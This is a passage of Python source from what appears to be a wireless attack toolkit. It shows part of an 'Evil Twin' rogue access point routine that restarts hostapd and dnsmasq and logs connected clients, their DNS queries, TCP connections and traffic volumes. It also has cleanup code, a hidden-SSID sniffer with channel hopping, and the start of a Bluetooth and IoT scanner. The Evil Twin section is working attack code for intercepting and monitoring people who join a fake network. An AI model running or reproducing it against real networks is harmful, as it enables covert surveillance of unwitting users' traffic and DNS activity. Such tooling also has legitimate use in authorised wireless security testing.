                    status_table.add_column("Security", style="yellow")
                    status_table.add_column("AP Status", style="magenta")
                    status_table.add_column("Running Time", style="cyan")
                    
                    elapsed = int(time.time() - start_time)
                    time_str = f"{elapsed//3600:02d}:{(elapsed%3600)//60:02d}:{elapsed%60:02d}"
                    
                    security_str = f"WPA2-PSK ({wpa_passphrase})" if use_wpa2 else "Open"
                    
                    # Check AP status
                    ap_status = "[bold green]Active"
                    if hostapd_proc.poll() is not None or dnsmasq_proc.poll() is not None:
                        ap_status = "[bold red]Error"
                        self.logger.log_evil_twin("Service crashed, attempting restart")
                        # Try to restart services if they've crashed
                        if hostapd_proc.poll() is not None:
                            hostapd_proc = subprocess.Popen(["hostapd", str(hostapd_path)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        if dnsmasq_proc.poll() is not None:
                            dnsmasq_proc = subprocess.Popen(["dnsmasq", "-C", str(dnsmasq_path), "-d"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    
                    status_table.add_row(ssid, str(channel), security_str, ap_status, time_str)

                    # Get current TCP connections (only for Evil Twin network)
                    if int(time.time()) % 10 == 0:  # Update every 10 seconds
                        try:
                            netstat = subprocess.check_output(["netstat", "-tn"], universal_newlines=True).split("\n")[2:]
                            tcp_connections = []
                            for line in netstat:
                                if "192.168.1." in line:  # Only show connections from Evil Twin network
                                    conn_parts = line.split()
                                    tcp_connections.append(conn_parts)
                                    # Log TCP connection
                                    if len(conn_parts) >= 6:
                                        self.logger.log_traffic(
                                            src=conn_parts[3],
                                            dst=conn_parts[4],
                                            bytes_count="N/A",
                                            protocol="TCP"
                                        )
                        except:
                            tcp_connections = []

                    # Create TCP connections table
                    tcp_table = Table(show_header=True, header_style="bold blue", title="[bold blue]Active TCP ESTABLISHED Connections[/] (Updates every 10s)")
                    tcp_table.add_column("Local Address", style="cyan")
                    tcp_table.add_column("Remote Address", style="green")
                    tcp_table.add_column("State", style="yellow")
                    
                    for conn in tcp_connections[-10:]:  # Show last 10 connections
                        if len(conn) >= 6 and conn[5] == "ESTABLISHED" and "192.168.1." in conn[3]:
                            tcp_table.add_row(conn[3], conn[4], conn[5])

                    # Create DNS queries table
                    dns_table = Table(show_header=True, header_style="bold green", title="[bold blue]Recent DNS Queries[/]")
                    dns_table.add_column("Time", style="cyan")
                    dns_table.add_column("Client IP", style="green")
                    dns_table.add_column("Query", style="yellow")
                    dns_table.add_column("Type", style="magenta")

                    # Read DNS queries from dnsmasq log (only for Evil Twin network)
                    if dnsmasq_log.exists():
                        with open(dnsmasq_log, "r") as f:
                            log_content = f.readlines()
                            for line in log_content[-20:]:  # Show last 20 DNS queries
                                if "query" in line and "192.168.1." in line:  # Only show queries from Evil Twin network
                                    try:
                                        parts = line.split()
                                        time_str = " ".join(parts[0:3])
                                        client_ip = parts[parts.index("from") + 1]
                                        query = parts[parts.index("query") + 1]
                                        query_type = parts[-1]
                                        dns_table.add_row(time_str, client_ip, query, query_type)
                                        # Log DNS query
                                        self.logger.log_dns_query(client_ip, query, query_type)
                                    except:
                                        continue

                    # Create clients table
                    clients_table = Table(show_header=True, header_style="bold yellow", title="[bold blue]Connected Clients[/]")
                    clients_table.add_column("MAC Address", style="cyan")
                    clients_table.add_column("IP Address", style="green")
                    clients_table.add_column("Connected Since", style="yellow")
                    clients_table.add_column("Data Transferred", style="magenta")

                    # Update connected clients from dnsmasq leases
                    try:
                        leases_file = log_dir / "dnsmasq.leases"
                        if leases_file.exists():
                            with open(leases_file, "r") as f:
                                leases = f.readlines()
                                current_clients = {}  # Temporary dictionary for current clients
                                for lease in leases:
                                    parts = lease.split()
                                    if len(parts) >= 5:
                                        mac = parts[1]
                                        ip = parts[2]
                                        hostname = parts[3]
                                        if ip.startswith("192.168.1."):  # Only show clients from Evil Twin network
                                            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                                            current_clients[mac] = {
                                                'ip': ip,
                                                'hostname': hostname,
                                                'connected_since': current_time
                                            }
                                            if mac not in clients_connected:
                                                # Log new client connection
                                                self.logger.log_evil_twin(f"New client connected: {mac} ({ip})")
                                                
                                # Update clients_connected with current clients only
                                clients_connected = current_clients
                                
                                # Save current clients to session file
                                try:
                                    with open(session_file, 'w') as f:
                                        json.dump(clients_connected, f)
                                except:
                                    pass
                    except:
                        pass

                    for mac, details in clients_connected.items():
                        # Get data transferred
                        try:
                            data = subprocess.check_output(["iptables", "-L", "FORWARD", "-v", "-n", "-x"]).decode()
                            for line in data.split("\n"):
                                if details['ip'] in line:
                                    bytes_str = line.split()[1]
                                    data_transferred = f"{int(bytes_str)/1024:.2f} KB"
                                    # Log traffic data
                                    self.logger.log_traffic(
                                        src=details['ip'],
                                        dst="*",
                                        bytes_count=bytes_str,
                                        protocol="ALL"
                                    )
                                    break
                            else:
                                data_transferred = "0 KB"
                        except:
                            data_transferred = "N/A"

                        clients_table.add_row(
                            mac,
                            details['ip'],
                            details['connected_since'],
                            data_transferred
                        )

                    # Update display with all tables
                    live.update(Group(
                        status_table,
                        Panel(clients_table, title="Connected Clients"),
                        Panel(dns_table, title="Recent DNS Queries"),
                        Panel(tcp_table, title="TCP Connections")
                    ))

                    time.sleep(1)

        except KeyboardInterrupt:
            self.logger.log_evil_twin("Attack stopped by user")
            self.console.print("\n[bold yellow]Evil Twin attack stopped by user.[/]")
        except Exception as e:
            self.logger.log_evil_twin(f"Error during attack: {str(e)}", error=True)
            self.console.print(f"\n[bold red]Error during Evil Twin attack: {str(e)}[/]")
        finally:
            # Cleanup and restore original settings
            self.cleanup_evil_twin(original_settings, log_dir)
            self.current_menu = "attack"

    def cleanup_evil_twin(self, original_settings, log_dir=None):
        """Cleanup Evil Twin attack resources"""
        log_dir = resolve_evil_twin_log_dir(self.logger.log_dir, log_dir)
        self.console.print("[bold blue]Cleaning up and restoring network settings...[/]")
        self.logger.log_evil_twin("Starting cleanup process")
        
        try:
            # Clear cache and temporary files
            cache_dir = Path("/tmp/wifiangel_evil_twin")
            if cache_dir.exists():
                try:
                    shutil.rmtree(cache_dir)
                except:
                    pass
            
            # Clear dnsmasq leases
            try:
                leases_file = log_dir / "dnsmasq.leases"
                if leases_file.exists():
                    # Just empty the file instead of removing it
                    with open(leases_file, 'w') as f:
                        pass  # Create empty file
                    # Set proper permissions
                    subprocess.run(["chmod", "644", str(leases_file)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass

            # Kill all related processes
            self.logger.log_evil_twin("Stopping all related processes")
            processes_to_kill = ["hostapd", "dnsmasq", "dhcpd", "wpa_supplicant"]
            for proc in processes_to_kill:
                subprocess.run(["killall", "-9", proc], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Reset IP forwarding
            if 'ip_forward' in original_settings:
                self.logger.log_evil_twin("Resetting IP forwarding")
                subprocess.run(["sysctl", f"net.ipv4.ip_forward={original_settings['ip_forward']}"], 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Reset iptables
            self.logger.log_evil_twin("Resetting iptables")
            subprocess.run(["iptables", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["iptables", "-t", "nat", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["iptables", "-t", "mangle", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["iptables", "-X"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Restore saved iptables rules
            if 'iptables' in original_settings:
                try:
                    with tempfile.NamedTemporaryFile(mode='w+') as f:
                        f.write(original_settings['iptables'])
                        f.flush()
                        subprocess.run(["iptables-restore", f.name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except:
                    self.logger.log_evil_twin("Failed to restore iptables configuration", error=True)
            
            # Stop monitor mode and switch back to managed mode
            if 'mon' in self.interface_name:
                try:
                    subprocess.run(["airmon-ng", "stop", self.interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    self.interface_name = self.interface_name.replace('mon', '')
                except:
                    self.logger.log_evil_twin("Failed to stop monitor mode using airmon-ng", error=True)
            
            # Ensure interface is in managed mode
            subprocess.run(["ip", "link", "set", self.interface_name, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["iw", self.interface_name, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ip", "link", "set", self.interface_name, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Restart network services in correct order
            if 'resolved_status' in original_settings and original_settings['resolved_status'] == 'active':
                subprocess.run(["systemctl", "restart", "systemd-resolved"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            if 'wpa_supplicant_status' in original_settings and original_settings['wpa_supplicant_status'] == 'active':
                subprocess.run(["systemctl", "restart", "wpa_supplicant"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            if 'network_manager_status' in original_settings and original_settings['network_manager_status'] == 'active':
                subprocess.run(["systemctl", "restart", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            self.console.print("[bold green]✓ Network settings restored successfully.[/]")
            self.console.print("[bold green]✓ Interface switched back to managed mode.[/]")
            self.console.print("[bold yellow]ℹ️ You can now manually connect to your WiFi network.[/]")
            
        except Exception as e:
            self.logger.log_evil_twin(f"Error during cleanup: {str(e)}", error=True)
            self.console.print(f"[bold red]Error during cleanup: {str(e)}[/]")
            
        finally:
            # Final verification of network service status
            self.verify_network_services()

    def verify_network_services(self):
        """Verify that network services are running correctly"""
        try:
            # Check NetworkManager status with timeout
            try:
                nm_status = subprocess.run(["systemctl", "is-active", "NetworkManager"], 
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5).stdout.decode().strip()
                if nm_status != "active":
                    self.console.print("[bold yellow]⚠️ NetworkManager is not active, attempting to restart...[/]")
                    try:
                        subprocess.run(["systemctl", "restart", "NetworkManager"], 
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
                        # Verify restart was successful
                        time.sleep(2)
                        nm_status = subprocess.run(["systemctl", "is-active", "NetworkManager"], 
                                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5).stdout.decode().strip()
                        if nm_status != "active":
                            self.console.print("[bold red]⚠️ Failed to restart NetworkManager[/]")
                    except subprocess.TimeoutExpired:
                        self.console.print("[bold red]⚠️ NetworkManager restart timed out[/]")
                    except Exception as e:
                        self.console.print(f"[bold red]⚠️ Error restarting NetworkManager: {str(e)}[/]")
            except subprocess.TimeoutExpired:
                self.console.print("[bold red]⚠️ NetworkManager status check timed out[/]")
            except Exception as e:
                self.console.print(f"[bold red]⚠️ Error checking NetworkManager: {str(e)}[/]")
            
            # Check wpa_supplicant status with timeout
            try:
                wpa_status = subprocess.run(["systemctl", "is-active", "wpa_supplicant"], 
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5).stdout.decode().strip()
                if wpa_status != "active":
                    self.console.print("[bold yellow]⚠️ wpa_supplicant is not active, attempting to restart...[/]")
                    try:
                        subprocess.run(["systemctl", "restart", "wpa_supplicant"], 
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
                        # Verify restart was successful
                        time.sleep(2)
                        wpa_status = subprocess.run(["systemctl", "is-active", "wpa_supplicant"], 
                                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5).stdout.decode().strip()
                        if wpa_status != "active":
                            self.console.print("[bold red]⚠️ Failed to restart wpa_supplicant[/]")
                    except subprocess.TimeoutExpired:
                        self.console.print("[bold red]⚠️ wpa_supplicant restart timed out[/]")
                    except Exception as e:
                        self.console.print(f"[bold red]⚠️ Error restarting wpa_supplicant: {str(e)}[/]")
            except subprocess.TimeoutExpired:
                self.console.print("[bold red]⚠️ wpa_supplicant status check timed out[/]")
            except Exception as e:
                self.console.print(f"[bold red]⚠️ Error checking wpa_supplicant: {str(e)}[/]")
            
            # Verify interface mode with improved error handling
            try:
                iw_info = subprocess.check_output(["iwconfig", self.interface_name], stderr=subprocess.STDOUT, timeout=5).decode()
                if "Mode:Managed" not in iw_info:
                    self.console.print("[bold yellow]⚠️ Interface not in managed mode, attempting to fix...[/]")
                    try:
                        subprocess.run(["ip", "link", "set", self.interface_name, "down"], 
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
                        subprocess.run(["iw", self.interface_name, "set", "type", "managed"], 
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
                        subprocess.run(["ip", "link", "set", self.interface_name, "up"], 
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
                        
                        # Verify change was successful
                        time.sleep(2)
                        iw_info = subprocess.check_output(["iwconfig", self.interface_name], stderr=subprocess.STDOUT, timeout=5).decode()
                        if "Mode:Managed" not in iw_info:
                            self.console.print("[bold red]⚠️ Failed to set interface to managed mode[/]")
                    except subprocess.TimeoutExpired:
                        self.console.print("[bold red]⚠️ Interface mode change timed out[/]")
                    except Exception as e:
                        self.console.print(f"[bold red]⚠️ Error changing interface mode: {str(e)}[/]")
            except subprocess.TimeoutExpired:
                self.console.print("[bold red]⚠️ Interface check timed out[/]")
            except Exception as e:
                self.console.print(f"[bold red]⚠️ Could not verify interface mode: {str(e)}[/]")
            
        except Exception as e:
            self.logger.error(f"Error during network service verification: {str(e)}")
            self.console.print("[bold red]⚠️ Could not verify network services status[/]")

    def hidden_ssid_discovery(self):
        """Discovers hidden SSIDs in all available frequencies"""
        # Variables to track the original state
        original_interface = self.interface_name
        was_in_monitor_mode = self.interface_name.endswith("mon")
        
        # Check if monitor mode is active, if not switch to it
        if not was_in_monitor_mode:
            self.console.print("[bold blue]Interface is not in monitor mode, switching to monitor mode...[/]")
            if not self.start_monitor_mode():
                self.console.print("[bold red]Failed to enable monitor mode! Aborting.[/]")
                return
            self.console.print(f"[bold green]Successfully switched to monitor mode: {self.interface_name}[/]")

        hidden_networks = {}
        scanning = True
        stop_event = threading.Event()
        
        # Start time for tracking duration
        start_time = time.time()
        
        # Create header information and warning message
        self.console.print("[bold blue]Starting Hidden SSID Discovery...[/]")
        self.console.print("[bold red]⚠️ Press Ctrl+C at any time to stop the scanning process! ⚠️[/]")
        self.console.print("[bold yellow]Scanning for hidden networks and waiting for probe requests...[/]")

        def create_status_table():
            table = Table(show_header=True, header_style="bold magenta", title="[bold blue]Hidden SSID Discovery[/]")
            table.add_column("BSSID", style="cyan")
            table.add_column("Channel", style="green")
            table.add_column("Signal", style="blue")
            table.add_column("Clients", style="magenta")
            table.add_column("Encryption", style="red")
            table.add_column("Probes", style="yellow")
            
            for bssid, data in hidden_networks.items():
                probes_text = "\n".join(data['probes'][-3:]) if data['probes'] else "No probes yet"
                table.add_row(
                    bssid,
                    str(data['channel']),
                    f"{data['signal']} dBm",
                    str(len(data['clients'])),
                    data['encryption'],
                    probes_text
                )
            
            return table

        def packet_handler(pkt):
            # This function should not return anything
            if stop_event.is_set():
                return

            try:
                if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                    bssid = pkt[Dot11].addr3
                    
                    # Check if SSID is hidden
                    if pkt.haslayer(Dot11Elt) and pkt[Dot11Elt].ID == 0:
                        ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                        if not ssid:  # Empty SSID indicates hidden network
                            # Get channel
                            try:
                                channel = int(ord(pkt[Dot11Elt:3].info))
                            except:
                                channel = 0
                            
                            # Get frequency
                            if channel >= 1 and channel <= 14:
                                frequency = 2407 + (channel * 5)
                            else:
                                frequency = 5000 + (channel * 5)
                            
                            # Get signal strength
                            try:
                                signal = -(256-ord(pkt.notdecoded[-4:-3]))
                            except:
                                signal = -100
                            
                            # Get encryption
                            encryption = self.get_security(pkt)
                            
                            current_time = datetime.now()
                            
                            if bssid not in hidden_networks:
                                hidden_networks[bssid] = {
                                    'channel': channel,
                                    'frequency': frequency,
                                    'signal': signal,
                                    'encryption': encryption,
                                    'clients': set(),
                                    'probes': [],
                                    'first_seen': current_time,
                                    'last_seen': current_time
                                }
                            else:
                                hidden_networks[bssid].update({
                                    'signal': signal,
                                    'last_seen': current_time
                                })
                
                # Process probe requests for hidden networks only
                elif pkt.haslayer(Dot11ProbeReq):
                    client_mac = pkt[Dot11].addr2
                    if pkt.haslayer(Dot11Elt) and pkt[Dot11Elt].ID == 0:
                        probe_ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                        if probe_ssid:  # Non-empty probe request
                            for network in hidden_networks.values():
                                if probe_ssid not in network['probes']:
                                    network['probes'].append(probe_ssid)
                
                # Process data frames for client detection (only for hidden networks)
                elif pkt.haslayer(Dot11) and pkt.type == 2:
                    bssid = pkt[Dot11].addr3
                    if bssid in hidden_networks:
                        src = pkt[Dot11].addr2
                        dst = pkt[Dot11].addr1
                        
                        if src and src != bssid:
                            hidden_networks[bssid]['clients'].add(src)
                        if dst and dst != bssid:
                            hidden_networks[bssid]['clients'].add(dst)
            
            except Exception as e:
                self.logger.error(f"Error processing packet: {str(e)}")
            
            # This function should not return anything
            return

        # Create a separate stop function
        def should_stop(pkt):
            return stop_event.is_set()

        def channel_hopper():
            while not stop_event.is_set():
                for channel in range(1, 15):  # 2.4 GHz channels
                    if stop_event.is_set():
                        break
                    try:
                        subprocess.run(["iwconfig", self.interface_name, "channel", str(channel)],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        time.sleep(0.5)
                    except:
                        pass

        try:
            # Start channel hopping thread
            hopper_thread = threading.Thread(target=channel_hopper)
            hopper_thread.daemon = True
            hopper_thread.start()

            # Use a simple manual refresh approach instead of Live for better compatibility
            while not stop_event.is_set():
                try:
                    # Display current scan information
                    elapsed = int(time.time() - start_time)
                    minutes = elapsed // 60
                    seconds = elapsed % 60
                    duration = f"{minutes:02d}:{seconds:02d}"
                    
                    # Clear screen and show updated information
                    os.system('clear' if os.name != 'nt' else 'cls')
                    
                    # Create status header
                    header = f"[bold blue]Hidden SSID Discovery - Duration: {duration}[/]"
                    self.console.print(header)
                    self.console.print(f"[bold yellow]Found {len(hidden_networks)} hidden networks[/]")
                    self.console.print("[bold red]Press Ctrl+C to stop scanning and return to main menu[/]")
                    
                    # Display network information if any found
                    if hidden_networks:
                        self.console.print(create_status_table())
                    else:
                        self.console.print("[bold yellow]Scanning for hidden networks... Please wait.[/]")
                    
                    # Perform packet sniffing for a short time
                    try:
                        sniff(iface=self.interface_name, 
                            prn=packet_handler,  # Packet processing function
                            store=0,
                            stop_filter=should_stop,  # Separate function for stop condition check
                            timeout=1)  # Short timeout for responsive updates
                    except KeyboardInterrupt:
                        self.console.print("\n[bold yellow]Stopping Hidden SSID discovery (Ctrl+C pressed)...[/]")
                        stop_event.set()
                        break
                    except Exception as e:
                        if not stop_event.is_set():
                            self.logger.error(f"Sniffing error: {str(e)}")
                        time.sleep(0.1)
                
                except KeyboardInterrupt:
                    self.console.print("\n[bold yellow]Stopping Hidden SSID discovery (Ctrl+C pressed)...[/]")
                    stop_event.set()
                    break
                
                # Biraz CPU rahatlatma
                time.sleep(0.2)
                
        except KeyboardInterrupt:
            self.console.print("\n[bold yellow]Stopping Hidden SSID discovery (Ctrl+C pressed)...[/]")
            stop_event.set()
            
        finally:
            # Clean up
            stop_event.set()
            if 'hopper_thread' in locals():
                hopper_thread.join(timeout=1.0)
            
            # Show final results if any hidden networks were found
            if hidden_networks:
                self.console.print("\n[bold green]Hidden Networks Found:[/]")
                
                # Create a more detailed final result table
                final_table = Table(show_header=True, header_style="bold magenta", title="[bold blue]Hidden Network Discovery Results[/]")
                final_table.add_column("BSSID", style="cyan")
                final_table.add_column("Channel", style="green")
                final_table.add_column("Signal", style="blue")
                final_table.add_column("Encryption", style="red")
                final_table.add_column("Discovered SSIDs", style="yellow")
                final_table.add_column("Connected Clients", style="magenta")
                
                for bssid, data in hidden_networks.items():
                    probes_text = "\n".join(data['probes']) if data['probes'] else "No SSIDs discovered"
                    clients_text = "\n".join(list(data['clients'])[:5]) if data['clients'] else "None detected"
                    
                    if len(data['clients']) > 5:
                        clients_text += f"\n... and {len(data['clients']) - 5} more"
                    
                    final_table.add_row(
                        bssid,
                        str(data['channel']),
                        f"{data['signal']} dBm",
                        data['encryption'],
                        probes_text,
                        clients_text
                    )
                
                self.console.print(final_table)
                
                # Display a summary of the scan
                total_duration = int(time.time() - start_time)
                minutes = total_duration // 60
                seconds = total_duration % 60
                
                self.console.print(f"\n[bold green]Scan completed in {minutes:02d}:{seconds:02d}[/]")
                self.console.print(f"[bold green]Found {len(hidden_networks)} hidden networks[/]")
                total_probes = sum(len(data['probes']) for data in hidden_networks.values())
                self.console.print(f"[bold green]Discovered {total_probes} potential SSIDs through probe requests[/]")
            else:
                self.console.print("\n[bold yellow]No hidden networks discovered.[/]")
            
            # Switch back to managed mode if we were not in monitor mode before
            if not was_in_monitor_mode:
                self.console.print("\n[bold blue]Switching back to managed mode...[/]")
                try:
                    # Disable monitor mode
                    subprocess.run(["airmon-ng", "stop", self.interface_name], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    
                    # Get original interface name (remove "mon" suffix if present)
                    if self.interface_name.endswith("mon"):
                        self.interface_name = self.interface_name[:-3]
                    
                    # Make sure interface is in managed mode
                    subprocess.run(["ip", "link", "set", self.interface_name, "down"], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["iw", self.interface_name, "set", "type", "managed"], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["ip", "link", "set", self.interface_name, "up"], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    
                    # Restart NetworkManager
                    subprocess.run(["systemctl", "restart", "NetworkManager"], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    
                    self.console.print(f"[bold green]Successfully switched back to managed mode: {self.interface_name}[/]")
                    self.logger.info(f"Switched back to managed mode: {self.interface_name}")
                except Exception as e:
                    self.console.print(f"[bold red]Error switching back to managed mode: {str(e)}[/]")
                    self.logger.error(f"Error switching back to managed mode: {str(e)}")
            
            # Give user a chance to see the results
            self.console.print("\n[bold yellow]Press Enter to return to the main menu...[/]")
            input()
            
            # Return to tools menu
            self.current_menu = "tools"

    def bluetooth_iot_scanner(self):
        """Scan for Bluetooth and IoT devices"""
        self.console.clear()
        self.create_header()

        menu = """
        [bold cyan]Bluetooth & IoT Scanner[/]
        
        1. 📱 BLE Device Scanner
        2. 🌐 IoT Service Discovery (mDNS)
        0. ⬅️ Back to Tools Menu
        """
        self.console.print(menu)
        
        choice = input("\nEnter your choice (0-2): ")
        
        if choice == "1":
            async def scan_ble_devices():
                devices = {}
                start_time = time.time()
                scan_duration = 60  # 60 seconds scan time
                
                def get_device_type(manufacturer_data, name):
                    """Determine device type based on manufacturer data and name"""
                    if not manufacturer_data and not name:
                        return "Unknown"
                        
                    # Apple devices
                    if 76 in manufacturer_data:  # Apple's company ID
                        if "AirPods" in name:
                            return "AirPods"
                        elif "Watch" in name:
                            return "Apple Watch"
                        elif "iPhone" in name:
                            return "iPhone"
                        return "Apple Device"
                    
                    # Common device types based on manufacturer IDs
                    manufacturer_types = {
                        6: "Microsoft Device",
                        117: "Samsung Device",
                        34819: "Govee Device",
                        89: "Intel Device",
                        10: "Nordic Semiconductor",
                        211: "Fitbit Device"
                    }
                    
                    # Check manufacturer IDs
                    for mfg_id in manufacturer_data.keys():
                        if mfg_id in manufacturer_types:
                            return manufacturer_types[mfg_id]
                    
                    # Check name-based device types
                    name_lower = name.lower()
                    if "speaker" in name_lower:
                        return "Bluetooth Speaker"
                    elif "headphone" in name_lower or "buds" in name_lower:
                        return "Headphones"
                    elif "watch" in name_lower:
                        return "Smartwatch"
                    elif "car" in name_lower:
                        return "Car System"
                    elif "tv" in name_lower:
                        return "Smart TV"
                    elif "mouse" in name_lower:
                        return "Mouse"
                    elif "keyboard" in name_lower:
                        return "Keyboard"
                    
                    return "Unknown BLE Device"
                
                def detection_callback(device, advertising_data):
                    device_type = get_device_type(advertising_data.manufacturer_data, device.name or "")
                    devices[device.address] = {
                        'name': device.name or "Unknown",
                        'rssi': advertising_data.rssi if advertising_data.rssi else "N/A",
                        'manufacturer_data': advertising_data.manufacturer_data,
                        'type': device_type,
                        'first_seen': datetime.now().strftime("%H:%M:%S")
                    }

                def create_status_table():
                    # Create and update the table with current results
                    table = Table(show_header=True, header_style="bold magenta", title="[bold cyan]Discovered BLE Devices[/]")
                    table.add_column("MAC Address", style="cyan")
                    table.add_column("Name", style="green")
                    table.add_column("Device Type", style="blue")
                    table.add_column("RSSI (dBm)", style="yellow")
                    table.add_column("First Seen", style="magenta")
                    
                    for addr, dev in sorted(devices.items(), key=lambda x: x[1]['first_seen']):
                        table.add_row(
                            addr,
                            dev['name'],
                            dev['type'],
                            str(dev['rssi']),
                            dev['first_seen']
                        )
                    
                    # Add scan time information
                    elapsed = int(time.time() - start_time)
                    remaining = max(scan_duration - elapsed, 0)
                    time_info = f"\n[bold yellow]Scan Time: {elapsed}s / {scan_duration}s (Remaining: {remaining}s)[/]"
                    
                    return Group(table, time_info)

                try:
                    self.console.print("\n[bold cyan]🔍 Starting BLE scan (60 seconds)...[/]")
                    self.console.print("[yellow]Press Ctrl+C to stop scanning[/]")
                    
                    async with BleakScanner(detection_callback=detection_callback) as scanner:
                        with Live(create_status_table(), refresh_per_second=2) as live:
                            while (time.time() - start_time) < scan_duration:
                                live.update(create_status_table())
                                await asyncio.sleep(0.5)
                                
                    # Show final results
                    self.console.print("\n[bold green]✓ Scan completed![/]")
                    if devices:
                        self.console.print(create_status_table())
                    else:
                        self.console.print("\n[yellow]No BLE devices found[/]")
                        
                except KeyboardInterrupt:
                    self.console.print("\n[bold yellow]Scan stopped by user![/]")
                    if devices:
                        self.console.print(create_status_table())
                    else:
                        self.console.print("\n[yellow]No BLE devices found[/]")
                except Exception as e:
                    self.console.print(f"\n[bold red]Error during BLE scan: {str(e)}[/]")

            try:
                asyncio.run(scan_ble_devices())
            except KeyboardInterrupt:
                pass
                
        elif choice == "2":
            # Check if interface is in monitor mode
            try:
                iw_info = subprocess.check_output(["iwconfig", self.interface_name]).decode()
                if "Mode:Monitor" in iw_info:
                    self.console.print("[bold yellow]⚠️ Interface is in monitor mode. Switching to managed mode...[/]")
                    # Stop monitor mode
                    subprocess.run(["airmon-ng", "stop", self.interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    # Get original interface name
                    self.interface_name = self.interface_name.replace("mon", "")
                    # Switch to managed mode
                    subprocess.run(["ip", "link", "set", self.interface_name, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["iw", self.interface_name, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["ip", "link", "set", self.interface_name, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    # Restart network services
                    subprocess.run(["systemctl", "restart", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(2)
                    self.console.print("[bold green]✓ Interface switched to managed mode[/]")
            except Exception as e:
                self.console.print(f"[bold red]Error checking interface mode: {str(e)}[/]")
                return

            # Get current network information
            try:
                ip_info = subprocess.check_output(["ip", "route", "show"]).decode()
                default_network = None
                for line in ip_info.split('\n'):
                    if 'default via' in line:
                        # Extract network interface and gateway
                        parts = line.split()
                        gateway = parts[2]
                        interface = parts[4]
                        # Get network address
                        ip_addr = subprocess.check_output(["ip", "addr", "show", interface]).decode()
                        for addr_line in ip_addr.split('\n'):
                            if 'inet ' in addr_line:
                                network = addr_line.split()[1].split('/')[0]
                                default_network = '.'.join(network.split('.')[:-1]) + '.0/24'
                                break
                        break
            except:
                default_network = "192.168.1.0/24"

            # Ask for IP block
            self.console.print(f"\n[bold cyan]Current Network: {default_network}[/]")
            ip_block = Prompt.ask("Enter IP block to scan (e.g., 192.168.1.0/24)", default=default_network)

            # Validate IP block format
            try:
                import ipaddress
                network = ipaddress.ip_network(ip_block, strict=False)
            except ValueError:
                self.console.print("[bold red]Invalid IP block format! Using default network.[/]")
                ip_block = default_network

            class IoTListener:
                def __init__(self, console, target_network):
                    self.console = console
                    self.discovered_services = {}
                    self.target_network = ipaddress.ip_network(target_network, strict=False)
                    self.start_time = time.time()
                    self.scan_duration = 15  # 15 seconds scan
                
                def add_service(self, zc, type_, name):
                    info = zc.get_service_info(type_, name)
                    if info:
                        addresses = info.parsed_addresses()
                        # Filter addresses based on target network
                        valid_addresses = []
                        for addr in addresses:
                            try:
                                if ipaddress.ip_address(addr) in self.target_network:
                                    valid_addresses.append(addr)
                            except:
                                continue
                        
                        if valid_addresses:
                            self.discovered_services[name] = {
                                'type': type_,
                                'addresses': valid_addresses,
                                'port': info.port,
                                'server': info.server if hasattr(info, 'server') else "Unknown",
                                'properties': {k.decode(): v.decode() if isinstance(v, bytes) else v 
                                            for k, v in info.properties.items()} if info.properties else {},
                                'first_seen': datetime.now().strftime("%H:%M:%S")
                            }
                        
                        # Create and update the table
                        table = Table(show_header=True, header_style="bold magenta", title=f"[bold cyan]Discovered IoT Services in {self.target_network}[/]")
                        table.add_column("Name", style="cyan")
                        table.add_column("Type", style="green")
                        table.add_column("IP Addresses", style="yellow")
                        table.add_column("Port", style="blue")
                        table.add_column("First Seen", style="magenta")
                        
                        for service_name, service in sorted(self.discovered_services.items(), key=lambda x: x[1]['first_seen']):
                            table.add_row(
